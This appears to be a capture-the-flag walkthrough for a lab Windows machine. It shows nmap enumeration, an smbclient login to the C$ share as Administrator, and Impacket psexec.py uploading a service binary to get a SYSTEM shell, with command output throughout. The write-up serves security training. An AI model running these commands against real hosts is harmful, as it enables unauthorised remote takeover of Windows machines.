# Tactics
Enumeration


```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.129.135.12 
[sudo] password for melle: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-22 12:43 CDT
Nmap scan report for 10.129.135.12
Host is up (0.23s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6s
| smb2-time: 
|   date: 2024-04-22T17:44:13
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.73 seconds
```


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/8985ba37-521e-47ca-b68d-8b91e594ceab)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/ff381e5a-5805-4747-9109-41cfb89c3aaa)
```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ smbclient  \\\\10.129.135.12\\C$  -U Administrator 
Password for [WORKGROUP\Administrator]:
Try "help" to get a list of possible commands.
smb: \> dir
  $Recycle.Bin                      DHS        0  Wed Apr 21 10:23:49 2021
  Config.Msi                        DHS        0  Wed Jul  7 13:04:56 2021
  Documents and Settings          DHSrn        0  Wed Apr 21 10:17:12 2021
  pagefile.sys                      AHS 738197504  Mon Apr 22 12:38:37 2024
  PerfLogs                            D        0  Sat Sep 15 02:19:00 2018
  Program Files                      DR        0  Wed Jul  7 13:04:24 2021
  Program Files (x86)                 D        0  Wed Jul  7 13:03:38 2021
  ProgramData                        DH        0  Tue Sep 13 11:27:53 2022
  Recovery                         DHSn        0  Wed Apr 21 10:17:15 2021
  System Volume Information         DHS        0  Wed Apr 21 10:34:04 2021
  Users                              DR        0  Wed Apr 21 10:23:18 2021
  Windows                             D        0  Wed Jul  7 13:05:23 2021
```
###### Foothold


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/c953b48c-8f4d-41b3-9fa5-6236ee981c20)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4b321c97-8ffb-4d48-9be3-91441c266635)

![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/70d28431-f319-4b49-acc0-99183a459423)


Syntax: sudo psexec.py username@{Target_IP}


```
┌──(melle㉿tuguldur)-[~/Downloads]
└─$ sudo python3 psexec.py administrator@10.129.135.12
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.135.12.....
[*] Found writable share ADMIN$
[*] Uploading file nvEFQWpw.exe
[*] Opening SVCManager on 10.129.135.12.....
[*] Creating service RgcW on 10.129.135.12.....
[*] Starting service RgcW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
```
![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/7702e7e3-a22d-4024-b39c-cbc09e33fff1)


![image](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2166f39a-593f-4dda-9bd9-a678288e097d)
`Got a shell as user ‘nt authority system’ 
`








